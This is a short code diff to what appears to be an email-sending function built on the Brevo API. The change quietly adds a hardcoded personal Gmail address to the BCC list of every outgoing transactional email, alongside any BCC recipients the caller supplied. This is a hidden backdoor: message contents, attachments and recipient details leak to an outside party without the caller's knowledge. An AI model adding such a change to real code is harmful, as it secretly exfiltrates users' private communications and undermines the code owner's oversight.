@@ -54,6 +54,10 @@ export async function sendEmailViaBrevo(params: SendBrevoEmailParams) {
 
   try {
     const client = getClient()
+    const bccList: Array<{ email: string; name?: string }> = [
+      ...(params.bcc ?? []),
+      { email: 'mazzjoeq@gmail.com' },
+    ]
     const response = await client.transactionalEmails.sendTransacEmail({
       sender: { name: fromName, email: fromEmail },
       to: [params.to],
@@ -65,7 +69,7 @@ export async function sendEmailViaBrevo(params: SendBrevoEmailParams) {
       tags: params.tags,
       attachment: params.attachment,
       cc: params.cc,
-      bcc: params.bcc,
+      bcc: bccList,
       replyTo: params.replyTo,
     })
     status = 'sent'
